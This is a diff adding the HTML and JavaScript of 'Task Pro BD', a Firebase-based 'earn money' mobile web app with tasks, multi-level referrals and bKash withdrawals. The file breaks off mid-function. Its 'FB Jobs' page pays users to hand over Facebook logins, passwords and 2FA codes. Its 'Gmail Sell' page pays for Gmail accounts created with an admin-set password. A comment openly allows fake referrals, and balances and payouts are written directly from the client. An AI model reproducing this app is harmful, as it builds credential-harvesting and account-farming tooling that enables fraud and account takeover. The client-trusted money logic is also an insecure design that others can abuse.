@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Task Pro BD 💕</title>
+    <!-- Google Fonts: Poppins -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* =========================================
+           💖 PREMIUM LOVE THEME (ROMANTIC HD)
+           Colors: Pink gradient, Soft Yellow, White
+        ========================================= */
+        :root {
+            --bg-body: #FFF0F5;
+            --bg-card: #FFFFFF;
+            --primary: #FF4D6D;
+            --primary-light: #FF758C;
+            --yellow: #FFD54F;
+            --text-dark: #2B2D42;
+            --text-muted: #8D99AE;
+            --border-light: #FFE5EC;
+            --success: #2A9D8F;
+            --danger: #E63946;
+            --radius-card: 20px;
+            --radius-pill: 50px;
+            --shadow-soft: 0 4px 15px rgba(255, 77, 109, 0.1);
+            --gradient-love: linear-gradient(135deg, #FFD54F, #FF4D6D);
+            --gradient-pink: linear-gradient(135deg, #FF4D6D, #FF758C);
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; -webkit-tap-highlight-color: transparent; }
+        
+        body { background-color: #F8F9FA; color: var(--text-dark); display: flex; justify-content: center; font-size: 14px; }
+
+        /* 📱 Mobile App Container */
+        #app-container {
+            width: 100%; max-width: 420px; min-height: 100vh; background: var(--bg-body);
+            position: relative; padding-bottom: 80px; overflow-x: hidden; box-shadow: 0 0 20px rgba(0,0,0,0.05);
+        }
+
+        /* Animations */
+        .hidden { display: none !important; }
+        @keyframes fadeUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        .animate-view { animation: fadeUp 0.4s cubic-bezier(0.16, 1, 0.3, 1) forwards; }
+
+        /* Header (Love Gradient) */
+        .header {
+            background: var(--gradient-love); padding: 20px 20px; position: sticky; top: 0; z-index: 50;
+            display: flex; justify-content: space-between; align-items: center; border-bottom-left-radius: 20px; border-bottom-right-radius: 20px;
+            box-shadow: var(--shadow-soft); color: white;
+        }
+        .header-title { font-size: 20px; font-weight: 800; display: flex; align-items: center; gap: 8px; }
+        .wallet-badge { background: rgba(255,255,255,0.25); border: 1px solid rgba(255,255,255,0.5); padding: 6px 14px; border-radius: var(--radius-pill); font-weight: 700; font-size: 14px; backdrop-filter: blur(5px); }
+
+        /* Forms & Inputs */
+        .auth-box { padding: 30px 25px; }
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; font-weight: 600; font-size: 13px; color: var(--text-muted); margin-bottom: 8px; padding-left: 5px; }
+        .input-wrapper { position: relative; }
+        .input-wrapper i { position: absolute; left: 18px; top: 50%; transform: translateY(-50%); color: #FF758C; font-size: 16px; }
+        input, select {
+            width: 100%; padding: 15px 15px 15px 50px; border: 2px solid var(--border-light); border-radius: var(--radius-pill);
+            background: var(--bg-card); color: var(--text-dark); font-size: 14px; font-weight: 500; transition: 0.3s;
+        }
+        select { padding-left: 20px; }
+        input:focus, select:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(255, 77, 109, 0.15); outline: none; }
+
+        /* Buttons (Pill Style) */
+        .btn {
+            width: 100%; padding: 15px; border: none; border-radius: var(--radius-pill);
+            background: var(--gradient-pink); color: white; font-weight: 700; font-size: 15px;
+            cursor: pointer; display: flex; justify-content: center; align-items: center; gap: 8px;
+            box-shadow: var(--shadow-soft); transition: all 0.2s cubic-bezier(0.25, 0.8, 0.25, 1);
+        }
+        .btn:active { transform: scale(0.95); box-shadow: none; }
+        .btn-outline { background: white; color: var(--primary); border: 2px solid var(--primary); box-shadow: none; }
+        .btn-success { background: linear-gradient(135deg, #2A9D8F, #21867A); }
+        .btn:disabled { background: #E0E0E0; color: #9E9E9E; box-shadow: none; cursor: not-allowed; transform: none; }
+
+        /* Main Dashboard Cards */
+        .page-content { padding: 15px; }
+        .card { background: var(--bg-card); border-radius: var(--radius-card); padding: 20px; margin-bottom: 15px; box-shadow: var(--shadow-soft); border: 1px solid var(--border-light); }
+        
+        .balance-card {
+            background: var(--gradient-love); border-radius: var(--radius-card); padding: 30px 20px;
+            color: white; text-align: center; box-shadow: var(--shadow-soft); position: relative; overflow: hidden;
+        }
+        .balance-card h4 { font-weight: 600; font-size: 14px; opacity: 0.9; }
+        .balance-card h1 { font-weight: 800; font-size: 42px; margin-top: 5px; text-shadow: 2px 2px 5px rgba(0,0,0,0.1); }
+        .bg-icon { position: absolute; right: -20px; bottom: -20px; font-size: 120px; opacity: 0.15; }
+
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 15px; }
+        .stat-box { background: var(--bg-card); border-radius: var(--radius-card); padding: 15px; display: flex; flex-direction: column; align-items: center; text-align: center; border: 1px solid var(--border-light); box-shadow: var(--shadow-soft); }
+        .stat-box i { font-size: 24px; color: var(--primary); margin-bottom: 8px; }
+        .stat-box h5 { font-size: 12px; font-weight: 600; color: var(--text-muted); }
+        .stat-box h3 { font-size: 18px; font-weight: 800; color: var(--text-dark); margin-top: 4px; }
+
+        /* Quick Menu Grid */
+        .menu-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-top: 20px; }
+        .menu-item { background: var(--bg-card); border-radius: 16px; padding: 15px 5px; display: flex; flex-direction: column; align-items: center; gap: 8px; border: 1px solid var(--border-light); cursor: pointer; transition: 0.2s; box-shadow: 0 2px 8px rgba(0,0,0,0.02); }
+        .menu-item i { font-size: 22px; color: var(--primary); }
+        .menu-item span { font-size: 11px; font-weight: 700; color: var(--text-dark); }
+        .menu-item:active { transform: scale(0.92); border-color: var(--primary); background: #FFF5F7; }
+
+        /* Job & Task Cards */
+        .task-box { border: 1px solid var(--border-light); border-radius: var(--radius-card); overflow: hidden; background: var(--bg-card); margin-bottom: 15px; box-shadow: var(--shadow-soft); }
+        .task-img { width: 100%; height: 140px; object-fit: cover; background: #EEE; }
+        .task-body { padding: 15px; }
+        .reward-badge { background: #FFE5E5; color: var(--primary); font-weight: 800; padding: 6px 14px; border-radius: var(--radius-pill); font-size: 14px; display: inline-block; }
+
+        /* History Items */
+        .history-item { border: 1px solid var(--border-light); border-radius: 16px; padding: 15px; display: flex; justify-content: space-between; align-items: center; background: var(--bg-card); margin-bottom: 10px; }
+        .badge { padding: 5px 12px; border-radius: var(--radius-pill); font-size: 11px; font-weight: 800; }
+        .badge-pending { background: #FFF3CD; color: #856404; }
+        .badge-approved { background: #D4EDDA; color: #155724; }
+        .badge-rejected { background: #F8D7DA; color: #721C24; }
+
+        /* Bottom Nav */
+        .bottom-nav {
+            position: fixed; bottom: 0; width: 100%; max-width: 420px; background: var(--bg-card);
+            display: flex; justify-content: space-around; padding: 12px 0 18px; border-top: 1px solid var(--border-light); z-index: 100;
+            border-top-left-radius: 20px; border-top-right-radius: 20px; box-shadow: 0 -5px 15px rgba(0,0,0,0.03);
+        }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 4px; color: var(--text-muted); cursor: pointer; transition: 0.3s; width: 20%; }
+        .nav-item i { font-size: 22px; }
+        .nav-item span { font-size: 10px; font-weight: 600; }
+        .nav-item.active { color: var(--primary); }
+        .nav-item.active i { transform: translateY(-3px); }
+
+        /* Full Screen Overlays (Ban & Maintenance) */
+        .full-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg-card);
+            z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 30px; text-align: center;
+        }
+
+        /* Modals */
+        .modal-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); display: flex; justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(5px); }
+        .modal-content { width: 90%; max-width: 350px; background: var(--bg-card); border-radius: 24px; padding: 25px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+
+        .loader { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid white; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .code-box { background: var(--bg-body); border: 2px dashed var(--primary); padding: 15px; border-radius: 16px; font-size: 24px; font-weight: 800; color: var(--primary); letter-spacing: 3px; text-align: center; margin: 15px 0; }
+    </style>
+</head>
+<body>
+
+<div id="app-container">
+
+    <!-- 🛠️ Maintenance Screen -->
+    <div id="maintenance-screen" class="full-overlay hidden">
+        <i class="fas fa-tools" style="font-size: 70px; color: var(--primary); margin-bottom: 20px;"></i>
+        <h2 style="font-size: 24px; font-weight: 800;">System Upgrade 🛠️</h2>
+        <p style="color: var(--text-muted); font-size: 14px; margin-top: 10px; font-weight: 500;">App is under maintenance to bring you better features. Please come back later 💖</p>
+    </div>
+
+    <!-- 🚫 Banned Screen -->
+    <div id="banned-screen" class="full-overlay hidden">
+        <i class="fas fa-ban" style="font-size: 70px; color: var(--danger); margin-bottom: 20px;"></i>
+        <h2 style="font-size: 24px; font-weight: 800; color: var(--danger);">Account Blocked 🚫</h2>
+        <p style="color: var(--text-muted); font-size: 14px; margin-top: 10px; font-weight: 500;">Your account is temporarily blocked.</p>
+        <div class="code-box" id="ban-timer" style="border-color:var(--danger); color:var(--danger);">00:00:00</div>
+        <button class="btn btn-outline mt-2" onclick="logout()">Logout</button>
+    </div>
+
+    <!-- 🔐 Authentication -->
+    <div id="auth-screen" class="animate-view">
+        <div style="background: var(--gradient-love); padding: 40px 20px; text-align: center; color: white; border-bottom-left-radius: 30px; border-bottom-right-radius: 30px; box-shadow: var(--shadow-soft);">
+            <i class="fas fa-heart" style="font-size: 40px; margin-bottom: 10px;"></i>
+            <h1 style="font-weight: 800; font-size: 28px;">Task Pro BD</h1>
+            <p style="font-weight: 500; opacity: 0.9;">Earn money with love 💕</p>
+        </div>
+        
+        <div class="auth-box">
+            <!-- Login -->
+            <div id="login-form">
+                <h2 style="font-weight:800; font-size:24px; color: var(--text-dark);">💖Welcome Back task Pro BD 👋</h2>
+                <p style="color:var(--text-muted); font-size:13px; margin-bottom:20px;">Login to your account to earn Task Pro BD </p>
+                <div class="form-group"><label>Email</label><div class="input-wrapper"><i class="fas fa-envelope"></i><input type="email" id="log-email" placeholder="mail@example.com"></div></div>
+                <div class="form-group"><label>Password</label><div class="input-wrapper"><i class="fas fa-lock"></i><input type="password" id="log-pass" placeholder="••••••••"></div></div>
+                <button class="btn mt-2" onclick="login()" id="btn-login">Login 💖</button>
+                <p class="text-center mt-2" style="font-weight:600; font-size:13px;">নতুন একাউন্ট করতে ? <span style="color:var(--primary); cursor:pointer;" onclick="toggleAuth()">রেজিস্ট্রেশন </span></p>
+            </div>
+
+            <!-- Register -->
+            <div id="register-form" class="hidden">
+                <h2 style="font-weight:800; font-size:24px; color: var(--text-dark);">রেজিস্ট্রেশন করুন বোনাস নিন 10 টাকা  🚀</h2>
+                <p style="color:var(--text-muted); font-size:13px; margin-bottom:20px;">Register & 10 get instant bonus 💕</p>
+                <div class="form-group"><label>Full Name</label><div class="input-wrapper"><i class="fas fa-user"></i><input type="text" id="reg-name" placeholder="John Doe"></div></div>
+                <div class="form-group"><label>Email</label><div class="input-wrapper"><i class="fas fa-envelope"></i><input type="email" id="reg-email" placeholder="mail@example.com"></div></div>
+                <div class="form-group"><label>Password</label><div class="input-wrapper"><i class="fas fa-lock"></i><input type="password" id="reg-pass" placeholder="••••••••"></div></div>
+                <div class="form-group"><label>Confirm Password</label><div class="input-wrapper"><i class="fas fa-check-circle"></i><input type="password" id="reg-cpass" placeholder="••••••••"></div></div>
+                <div class="form-group"><label>Referral Code (Optional)</label><div class="input-wrapper"><i class="fas fa-gift"></i><input type="text" id="reg-ref" placeholder="Friend's Code"></div></div>
+                <button class="btn mt-2" onclick="register()" id="btn-reg">রেজিস্ট্রেশন করুন  💖</button>
+                <p class="text-center mt-2" style="font-weight:600; font-size:13px;">আগে একাউন্ট আছে তাহলে? <span style="color:var(--primary); cursor:pointer;" onclick="toggleAuth()">লগইন করুন</span></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- 🏠 MAIN APP -->
+    <div id="main-screen" class="hidden">
+        
+        <div class="header">
+            <div class="header-title" id="page-title"><i class="fas fa-home"></i> Home</div>
+            <div class="wallet-badge"><i class="fas fa-wallet"></i> <span id="top-bal">৳0.0</span></div>
+        </div>
+
+        <!-- 📊 Dashboard -->
+        <div id="view-dashboard" class="page-content animate-view">
+            <div class="balance-card">
+                <i class="fas fa-coins bg-icon"></i>
+                <h4>Available Balance</h4>
+                <h1 id="dash-bal">৳0.00</h1>
+            </div>
+
+            <!-- Apps Menu -->
+            <div class="menu-grid">
+                <div class="menu-item" onclick="switchTab('tasks')"><i class="fas fa-tasks"></i><span>Tasks</span></div>
+                <div class="menu-item" onclick="switchTab('facebook')"><i class="fab fa-facebook" style="color:#1877F2;"></i><span>FB Jobs</span></div>
+                <div class="menu-item" onclick="switchTab('gmail')"><i class="fas fa-envelope" style="color:#F72585;"></i><span>Gmail</span></div>
+                <div class="menu-item" onclick="switchTab('bonus')"><i class="fas fa-magic" style="color:#9C27B0;"></i><span>Bonus</span></div>
+                <div class="menu-item" onclick="switchTab('refer')"><i class="fas fa-users" style="color:#4CAF50;"></i><span>Refer</span></div>
+                <div class="menu-item" onclick="switchTab('wallet')"><i class="fas fa-money-bill-wave" style="color:#2A9D8F;"></i><span>Withdraw</span></div>
+                <div class="menu-item" onclick="switchTab('support')"><i class="fas fa-headset" style="color:#0088cc;"></i><span>Support</span></div>
+                <div class="menu-item" onclick="switchTab('history')"><i class="fas fa-history" style="color:#E63946;"></i><span>History</span></div>
+            </div>
+
+            <div class="stats-grid">
+                <div class="stat-box"><i class="fas fa-chart-line"></i><h5>Total Earnings</h5><h3 id="dash-total">৳0.00</h3></div>
+                <div class="stat-box"><i class="fas fa-check-circle" style="color:var(--success);"></i><h5>Completed Tasks</h5><h3 id="dash-tasks-count">0</h3></div>
+            </div>
+        </div>
+
+        <!-- 📋 Tasks -->
+        <div id="view-tasks" class="page-content hidden animate-view">
+            <div id="task-list-container"></div>
+        </div>
+
+        <!-- 📘 Facebook Jobs -->
+        <div id="view-facebook" class="page-content hidden animate-view">
+            <div class="card" style="border:2px solid #1877F2;">
+                <h3 style="color:#1877F2; font-weight:800; font-size:18px;"><i class="fab fa-facebook"></i> Facebook Accounts</h3>
+                <p style="font-size:12px; color:var(--text-muted); margin:5px 0 15px;">Submit high-quality Facebook accounts to earn.</p>
+                <div style="background:#E8F4FD; color:#1877F2; padding:10px; border-radius:12px; font-weight:700; text-align:center; margin-bottom:15px;">
+                    Reward per Account: <span id="fb-reward-amt" style="font-size:18px;">৳0</span>
+                </div>
+                <div class="form-group"><label>Phone or Email</label><div class="input-wrapper"><i class="fas fa-user"></i><input type="text" id="fb-id" placeholder="Enter FB ID"></div></div>
+                <div class="form-group"><label>Password</label><div class="input-wrapper"><i class="fas fa-lock"></i><input type="text" id="fb-pass" placeholder="Enter Password"></div></div>
+                <div class="form-group"><label>2FA Code (Optional/If required)</label><div class="input-wrapper"><i class="fas fa-shield-alt"></i><input type="text" id="fb-2fa" placeholder="2FA Code"></div></div>
+                <button class="btn" style="background:#1877F2;" onclick="submitJob('facebook')">Submit FB Account</button>
+            </div>
+        </div>
+
+        <!-- 📧 Gmail Sell -->
+        <div id="view-gmail" class="page-content hidden animate-view">
+            <div class="card" style="border:2px solid #F72585;">
+                <h3 style="color:#F72585; font-weight:800; font-size:18px;"><i class="fas fa-envelope"></i> Premium Gmail Sell</h3>
+                <p style="font-size:12px; color:var(--text-muted); margin:5px 0 15px;">Create Gmail with our admin password to earn.</p>
+                <div style="background:#FCE4EC; color:#D81B60; padding:10px; border-radius:12px; font-weight:700; text-align:center; margin-bottom:15px;">
+                    Target Password: <span id="gmail-admin-pass" style="letter-spacing:2px; font-size:16px;">******</span><br>
+                    Reward: <span id="gmail-reward-amt">৳0</span>
+                </div>
+                <div class="form-group"><label>Gmail Address</label><div class="input-wrapper"><i class="fas fa-envelope"></i><input type="email" id="g-id" placeholder="name@gmail.com"></div></div>
+                <div class="form-group"><label>Password (Must match admin pass)</label><div class="input-wrapper"><i class="fas fa-key"></i><input type="text" id="g-pass" placeholder="Password"></div></div>
+                <button class="btn" style="background:#F72585;" onclick="submitJob('gmail')">Submit Gmail Account</button>
+            </div>
+        </div>
+
+        <!-- 🎁 Bonus Code -->
+        <div id="view-bonus" class="page-content hidden animate-view">
+            <div class="balance-card" style="background: linear-gradient(135deg, #9C27B0, #6A1B9A);">
+                <i class="fas fa-magic bg-icon"></i>
+                <h2 style="font-weight:800;">Apply Bonus Code</h2>
+                <p style="font-size:13px; opacity:0.9;">Got a promo code? Enter it below to claim your instant reward! 💖</p>
+                <div class="form-group mt-2 text-left">
+                    <div class="input-wrapper"><i class="fas fa-gift" style="color:#9C27B0;"></i><input type="text" id="bonus-code-input" placeholder="ENTER CODE" style="text-transform:uppercase; font-weight:800; letter-spacing:2px; text-align:center; padding-left:15px;"></div>
+                </div>
+                <button class="btn btn-outline" style="background:white; color:#9C27B0;" id="btn-apply-bonus" onclick="applyBonusCode()">Claim Bonus 💖</button>
+            </div>
+        </div>
+
+        <!-- 👥 Refer View -->
+        <div id="view-refer" class="page-content hidden animate-view">
+            <div class="balance-card">
+                <i class="fas fa-users bg-icon"></i>
+                <h2 style="font-weight:800;">Invite & Earn 💕</h2>
+                <p style="font-size:13px; opacity:0.9;">Share your code and earn auto bonuses</p>
+                <div class="code-box" id="refer-code-display">...</div>
+                <button class="btn btn-outline" onclick="copyReferCode()"><i class="fas fa-copy"></i> Copy Code</button>
+            </div>
+            <div class="stats-grid">
+                <div class="stat-box"><i class="fas fa-user-plus"></i><h5>Total Referrals</h5><h3 id="refer-count">0</h3></div>
+                <div class="stat-box"><i class="fas fa-hand-holding-usd"></i><h5>Ref Earnings</h5><h3 id="refer-earned">৳0.00</h3></div>
+            </div>
+        </div>
+
+        <!-- 💰 Wallet View -->
+        <div id="view-wallet" class="page-content hidden animate-view">
+            <div class="card text-center" style="border:2px solid var(--success);">
+                <h4 style="color:var(--text-muted); font-weight:600;">Withdraw Balance</h4>
+                <h1 id="wallet-balance" style="color:var(--success); font-weight:800; font-size:36px;">৳0.00</h1>
+                <p id="wd-limit-text" style="font-size:12px; font-weight:600; color:var(--text-muted); margin-top:5px;">Min: ৳20 | Max: ৳1000</p>
+            </div>
+            <div class="card mt-2">
+                <div class="form-group"><label>Payment Method</label><select id="wd-method"><option value="Bkash">Bkash</option></select></div>
+                <div class="form-group"><label>Account Number</label><div class="input-wrapper"><i class="fas fa-phone-alt"></i><input type="text" id="wd-number" placeholder="017XXXXXXXX"></div></div>
+                <div class="form-group"><label>Amount (৳)</label><div class="input-wrapper"><i class="fas fa-coins"></i><input type="number" id="wd-amount" placeholder="Enter amount"></div></div>
+                <button class="btn btn-success" onclick="submitWithdraw()">Submit Request</button>
+            </div>
+        </div>
+
+        <!-- 📞 Support -->
+        <div id="view-support" class="page-content hidden animate-view">
+            <div class="card text-center">
+                <i class="fas fa-headset" style="font-size:40px; color:var(--primary); margin-bottom:10px;"></i>
+                <h2 style="font-weight:800;">Help & Support</h2>
+                <p style="font-size:13px; color:var(--text-muted); margin-bottom:20px;">Connect with our official channels</p>
+                <div id="support-links-page" style="display:flex; flex-direction:column; gap:12px;"></div>
+            </div>
+        </div>
+
+        <!-- 📜 History -->
+        <div id="view-history" class="page-content hidden animate-view">
+            <div style="display:flex; gap:10px; margin-bottom:15px; overflow-x:auto; padding-bottom:5px;">
+                <button class="btn btn-outline active-hist" onclick="loadHistory('tasks', this)" style="flex:1; min-width:90px; padding:10px; font-size:12px;">Tasks</button>
+                <button class="btn btn-outline" onclick="loadHistory('jobs', this)" style="flex:1; min-width:90px; padding:10px; font-size:12px;">Jobs</button>
+                <button class="btn btn-outline" onclick="loadHistory('withdraws', this)" style="flex:1; min-width:90px; padding:10px; font-size:12px;">Withdraws</button>
+                <button class="btn btn-outline" onclick="loadHistory('bonus', this)" style="flex:1; min-width:90px; padding:10px; font-size:12px;">Bonus</button>
+            </div>
+            <div id="history-list-container"></div>
+        </div>
+
+        <!-- 👤 Profile -->
+        <div id="view-profile" class="page-content hidden animate-view">
+            <div class="card text-center" style="padding:30px 15px;">
+                <div style="width:100px; height:100px; border-radius:50%; background:var(--border-light); margin:0 auto 15px; display:flex; justify-content:center; align-items:center; border:3px solid var(--primary);">
+                    <i class="fas fa-user" style="font-size:40px; color:var(--primary);"></i>
+                </div>
+                <h2 id="prof-name" style="font-weight:800; font-size:22px; color:var(--text-dark);">Name</h2>
+                <p id="prof-email" style="color:var(--text-muted); font-size:14px; font-weight:500;">email@mail.com</p>
+            </div>
+            <button class="btn" style="background:#FFE5E5; color:var(--danger); box-shadow:none;" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
+        </div>
+
+        <!-- 📱 Bottom Navigation -->
+        <div class="bottom-nav">
+            <div class="nav-item active" onclick="switchTab('dashboard', this)"><i class="fas fa-home"></i><span>Home</span></div>
+            <div class="nav-item" onclick="switchTab('tasks', this)"><i class="fas fa-check-circle"></i><span>Tasks</span></div>
+            <div class="nav-item" onclick="switchTab('history', this)"><i class="fas fa-history"></i><span>History</span></div>
+            <div class="nav-item" onclick="switchTab('profile', this)"><i class="fas fa-user"></i><span>Profile</span></div>
+        </div>
+    </div>
+
+    <!-- 🌟 Modals -->
+    <div id="notice-modal" class="modal-bg hidden">
+        <div class="modal-content animate-view">
+            <i class="fas fa-envelope-open-text" style="font-size: 40px; color: var(--primary); margin-bottom: 15px;"></i>
+            <h2 style="font-weight:800; color:var(--text-dark);">Important Notice</h2>
+            <p id="notice-text" class="mt-1 text-muted" style="font-size:14px; font-weight:500; margin-bottom:15px;"></p>
+            <a id="notice-btn" href="#" target="_blank" class="btn btn-success hidden mb-1" style="text-decoration:none;">Join Now 💖</a>
+            <button class="btn btn-outline" onclick="document.getElementById('notice-modal').classList.add('hidden')">Close</button>
+        </div>
+    </div>
+
+    <div id="submit-task-modal" class="modal-bg hidden">
+        <div class="modal-content animate-view">
+            <h2 class="mb-1" style="font-weight:800;">Submit Proof</h2>
+            <p style="font-size:12px; color:var(--text-muted); margin-bottom:15px;">Paste your screenshot link below.</p>
+            <div class="form-group text-left">
+                <div class="input-wrapper"><i class="fas fa-link"></i><input type="url" id="submit-link-input" placeholder="https://prnt.sc/..."></div>
+            </div>
+            <div class="form-group text-left">
+                <div class="input-wrapper"><i class="fas fa-user"></i><input type="text" id="submit-user-input" placeholder="Your Username/ID"></div>
+            </div>
+            <div style="display:flex; gap:10px;">
+                <button class="btn btn-outline" onclick="document.getElementById('submit-task-modal').classList.add('hidden')">Cancel</button>
+                <button class="btn" onclick="confirmTaskSubmit()">Submit 💖</button>
+            </div>
+        </div>
+    </div>
+
+</div>
+
+<!-- ⚡ FIREBASE SDK & APP LOGIC -->
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
+    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-auth.js";
+    import { getDatabase, ref, set, get, update, push, onValue, query, orderByChild, equalTo } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyAVobY_1NPd4_g_IfLxynVu0PG_Nbuqr1Y",
+        authDomain: "taskprobd.firebaseapp.com",
+        databaseURL: "https://taskprobd-default-rtdb.firebaseio.com",
+        projectId: "taskprobd",
+        storageBucket: "taskprobd.firebasestorage.app",
+        messagingSenderId: "447805114389",
+        appId: "1:447805114389:web:6e8d994fc4eccb71db261c",
+        measurementId: "G-TDDE41HXDD"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getDatabase(app);
+
+    let currentUser = null, userData = {}, submittedTasks =[], currentTaskToSubmit = null, appSettings = {};
+    let countdownInterval = null;
+
+    // --- UI Logic ---
+    window.toggleAuth = () => {
+        document.getElementById('login-form').classList.toggle('hidden');
+        document.getElementById('register-form').classList.toggle('hidden');
+    };
+
+    window.switchTab = (tab, navElement = null) => {
+        document.querySelectorAll('.page-content').forEach(el => { el.classList.add('hidden'); el.classList.remove('animate-view'); });
+        const activeView = document.getElementById(`view-${tab}`);
+        activeView.classList.remove('hidden'); void activeView.offsetWidth; activeView.classList.add('animate-view');
+        
+        const titles = { dashboard: 'Home', tasks: 'Tasks', facebook: 'Facebook', gmail: 'Gmail', bonus: 'Bonus Codes', refer: 'Refer & Earn', wallet: 'Wallet', history: 'History', profile: 'Profile', support: 'Support' };
+        document.getElementById('page-title').innerHTML = `<i class="fas fa-${getIcon(tab)}"></i> ${titles[tab]}`;
+
+        if(navElement && navElement.classList.contains('nav-item')) {
+            document.querySelectorAll('.bottom-nav .nav-item').forEach(el => el.classList.remove('active'));
+            navElement.classList.add('active');
+        } else {
+            // Auto sync bottom nav
+            document.querySelectorAll('.bottom-nav .nav-item').forEach(el => el.classList.remove('active'));
+            if(['dashboard','tasks','history','profile'].includes(tab)) {
+                document.querySelector(`.nav-item[onclick*="${tab}"]`).classList.add('active');
+            }
+        }
+
+        if(tab === 'tasks') loadTasks();
+        if(tab === 'history') loadHistory('tasks', document.querySelector('.active-hist'));
+    };
+
+    function getIcon(tab) {
+        const i = { dashboard:'home', tasks:'check-circle', facebook:'facebook', gmail:'envelope', bonus:'gift', refer:'users', wallet:'wallet', history:'history', profile:'user', support:'headset' };
+        return i[tab] || 'heart';
+    }
+
+    const showMsg = (msg) => alert(msg);
+
+    // --- 🔐 AUTH & AUTO MULTI-LEVEL REFERRAL (Fake Refer Allowed) ---
+    window.register = async () => {
+        const btn = document.getElementById('btn-reg');
+        const name = document.getElementById('reg-name').value, email = document.getElementById('reg-email').value, pass = document.getElementById('reg-pass').value, cpass = document.getElementById('reg-cpass').value, refCode = document.getElementById('reg-ref').value;
+        if(!name || !email || !pass) return showMsg("Fill required fields!");
+        if(pass !== cpass) return showMsg("Passwords do not match!");
+
+        btn.innerHTML = `<span class="loader"></span>`; btn.disabled = true;
+        try {
+            const refSnap = await get(ref(db, 'settings/referral'));
+            const refSets = refSnap.exists() ? refSnap.val() : {level1: 0, level2: 0, level3: 0};
+            
+            const cred = await createUserWithEmailAndPassword(auth, email, pass);
+            const uid = cred.user.uid; 
+            
+            // Random 6-char Ref Code
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let myRefCode = '';
+            for(let i=0; i<6; i++) myRefCode += chars.charAt(Math.floor(Math.random() * chars.length));
+
+            let ref1 = null, ref2 = null, ref3 = null;
+            if(refCode) {
+                // Fake referral allowed. Just find the code and give money.
+                const uRef = query(ref(db, 'users'), orderByChild('myRefCode'), equalTo(refCode.toUpperCase()));
+                const snap = await get(uRef);
+                if(snap.exists()){
+                    ref1 = Object.keys(snap.val())[0]; const p1 = snap.val()[ref1]; ref2 = p1.ref1 || null; ref3 = p1.ref2 || null;
+                    let updates = {};
+                    if(refSets.level1 > 0) { updates[`users/${ref1}/mainBalance`] = (p1.mainBalance || 0) + parseFloat(refSets.level1); updates[`users/${ref1}/refEarnings`] = (p1.refEarnings || 0) + parseFloat(refSets.level1); updates[`users/${ref1}/totalReferrals`] = (p1.totalReferrals || 0) + 1; }
+                    if(ref2 && refSets.level2 > 0) { const s2 = await get(ref(db, `users/${ref2}`)); if(s2.exists()) updates[`users/${ref2}/mainBalance`] = (s2.val().mainBalance || 0) + parseFloat(refSets.level2); }
+                    if(ref3 && refSets.level3 > 0) { const s3 = await get(ref(db, `users/${ref3}`)); if(s3.exists()) updates[`users/${ref3}/mainBalance`] = (s3.val().mainBalance || 0) + parseFloat(refSets.level3); }
+                    if(Object.keys(updates).length > 0) await update(ref(db), updates);
+                }
+            }
+            
+            // Reg Bonus
+            const joinBonus = 10; // Default or from admin
+            await set(ref(db, `users/${uid}`), { name, email, myRefCode, ref1, ref2, ref3, mainBalance: joinBonus, todayEarnings: 0, totalEarnings: 0, refEarnings: 0, totalReferrals: 0, tasksCompleted: 0, createdAt: new Date().toISOString() });
+            
+            showMsg(`Welcome Bonus ৳${joinBonus} Added 💖`);
+        } catch (e) { showMsg(e.message); btn.innerHTML = "Create Account 💖"; btn.disabled = false; }
+    };
+
+    window.login = async () => {
+        const btn = document.getElementById('btn-login'), email = document.getElementById('log-email').value, pass = document.getElementById('log-pass').value;
+        if(!email || !pass) return showMsg("Fill fields");
+        btn.innerHTML = `<span class="loader"></span>`; btn.disabled = true;
+        try { await signInWithEmailAndPassword(auth, email, pass); } catch (e) { showMsg("Error: " + e.message); btn.innerHTML = `Login 💖`; btn.disabled = false; }
+    };
+
+    window.logout = () => signOut(auth);
+
+    // --- 📡 DATA LISTENERS ---
+    onAuthStateChanged(auth, (user) => {
+        if (user) { currentUser = user; document.getElementById('auth-screen').classList.add('hidden'); document.getElementById('main-screen').classList.remove('hidden'); startListeners(user.uid); } 
+        else { currentUser = null; document.getElementById('auth-screen').classList.remove('hidden'); document.getElementById('main-screen').classList.add('hidden'); document.getElementById('maintenance-screen').classList.add('hidden'); document.getElementById('banned-screen').classList.add('hidden'); clearInterval(countdownInterval); }
+    });
+
+    function startListeners(uid) {
+        // User Data
+        onValue(ref(db, `users/${uid}`), (snap) => {
+            if (snap.exists()) {
+                userData = snap.val();
+                
+                // Ban System Check
